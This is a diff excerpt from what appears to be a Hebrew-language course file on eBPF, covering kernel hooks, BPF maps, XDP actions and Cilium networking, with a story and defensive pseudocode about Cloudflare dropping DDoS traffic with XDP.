+  <rect x="60" y="68" width="240" height="26" rx="6" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
+  <text x="180" y="85" text-anchor="middle" font-size="10" fill="#93c5fd">Kernel Verifier — בודק safety (no loops, no crashes)</text>
+  <line x1="180" y1="94" x2="180" y2="108" stroke="#3b82f6" stroke-width="1.5"/>
+  <rect x="10" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
+  <text x="60" y="123" text-anchor="middle" font-size="9" fill="#86efac">XDP Hook (NIC)</text>
+  <rect x="130" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
+  <text x="180" y="123" text-anchor="middle" font-size="9" fill="#86efac">TC Hook (traffic ctrl)</text>
+  <rect x="250" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
+  <text x="300" y="123" text-anchor="middle" font-size="9" fill="#86efac">Socket filter</text>
+</svg>
+</div>
+<p>eBPF programs מוכנסים ל-hooks בגרעין. הgverifier מבטיח שהם לא יגרמו crash, לא ירוצו לנצח, ולא ייגשו לזיכרון לא מורשה.</p>
+<h3>Maps — תקשורת kernel ↔ user space</h3>
+<div class="code-preview"><pre><code>// eBPF program (C)
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __type(key, __u32);   // source IP
+    __type(value, __u64); // packet count
+} packet_count SEC(".maps");
+
+SEC("xdp")
+int count_packets(struct xdp_md *ctx) {
+    struct iphdr *ip = /* parse IP header */;
+    __u64 *count = bpf_map_lookup_elem(&packet_count, &ip->saddr);
+    if (count) (*count)++;
+    return XDP_PASS;
+}</code></pre></div>
+</div>`
+      },
+      {
+        type: "explanation",
+        title: "XDP ו-Cilium — use cases",
+        content: `<div dir="rtl">
+<h2>מה עושים עם eBPF בפועל</h2>
+<h3>XDP — eXpress Data Path</h3>
+<p>XDP פועל על ה-NIC driver — לפני שהpacket מגיע ל-kernel network stack. המהירות: עשרות מיליוני packets לשנייה עם CPU בודד.</p>
+<table class="content-table">
+  <tr><th>XDP Action</th><th>מה עושה</th></tr>
+  <tr><td><code>XDP_DROP</code></td><td>זורק packet מיידית — DDoS mitigation בלי kernel overhead</td></tr>
+  <tr><td><code>XDP_PASS</code></td><td>מעביר ל-kernel stack — עיבוד רגיל</td></tr>
+  <tr><td><code>XDP_TX</code></td><td>שולח בחזרה מאותו interface — hairpin</td></tr>
+  <tr><td><code>XDP_REDIRECT</code></td><td>מפנה ל-interface אחר — load balancing מהיר</td></tr>
+</table>
+<h3>Cilium — Kubernetes Networking עם eBPF</h3>
+<p>Cilium מחליף iptables ב-Kubernetes לחלוטין. iptables = O(n) lookup, רשימות ענקיות. eBPF maps = O(1) hash lookup.</p>
+<div class="code-preview"><pre><code># בדיקה שCilium תקין
+cilium status
+cilium endpoint list
+
+# כלי observability שמגיע עם Cilium
+hubble observe --namespace production
+# רואה: src pod → dst pod, protocol, verdict (allow/drop)</code></pre></div>
+<h3>כלים נוספים</h3>
+<ul>
+<li><strong>bpftrace</strong> — scripting language לeBPF, כמו DTrace</li>
+<li><strong>libbpf</strong> — C library לפיתוח eBPF programs</li>
+<li><strong>Falco</strong> — security detection עם eBPF (syscall monitoring)</li>
+<li><strong>Pixie</strong> — application observability בלי code changes</li>
+</ul>
+</div>`
+      },
+      {
+        type: "story",
+        title: "הסיפור: Cloudflare עוצרת DDoS עם eBPF",
+        content: `<div dir="rtl">
+<h2>כשגל של 800Gbps הגיע — ובכל זאת נשארנו online</h2>
+<p>ספטמבר 2022: Cloudflare דיווחה על DDoS attack של 2.5 ביליון packets לשנייה. בגישה הישנה (iptables), כל rule הוא scan ליניארי — 10,000 rules = 10,000 בדיקות לכל packet. בלתי אפשרי.</p>
+<p>Cloudflare בנתה מערכת XDP-based: כל traffic מנותח ב-eBPF עוד על ה-NIC. Fingerprint של DDoS traffic (TTL, IP options, packet size distribution) → XDP_DROP מיידי — הpacket לא נוגע ב-kernel כלל.</p>
+<p>הנתונים: תוך 20 שניות מזיהוי → 2.5B pps dropped לפני שנגעו ב-stack. תשתית Cloudflare המשיכה לשרת traffic לגיטימי ללא הפרעה.</p>
+<div class="code-preview"><pre><code># pseudocode של Cloudflare XDP DDoS mitigation
+SEC("xdp")
+int mitigate_ddos(struct xdp_md *ctx) {
+    // Parse IP header
+    if (is_spoofed_source_ip(ip->saddr))
+        return XDP_DROP;
+
+    // Rate limiting per-IP using BPF map
+    if (exceeds_rate_limit(ip->saddr))
+        return XDP_DROP;
+
+    // Known attack signature
+    if (matches_ddos_fingerprint(ctx))
+        return XDP_DROP;
+
+    return XDP_PASS; // legitimate traffic
+}</code></pre></div>
+<p><strong>הלקח:</strong> הגבול בין network ו-programming נמחק. eBPF מאפשר לבנות custom networking logic שפועל מהר יותר מכל hardware appliance — ישירות על commodity servers. זו הסיבה שכל חברה גדולה (Google, Meta, Netflix, Cloudflare) משקיעה כבד ב-eBPF.</p>
+</div>`
+      }
+    ]
+  }
+]
   }
 ]
 
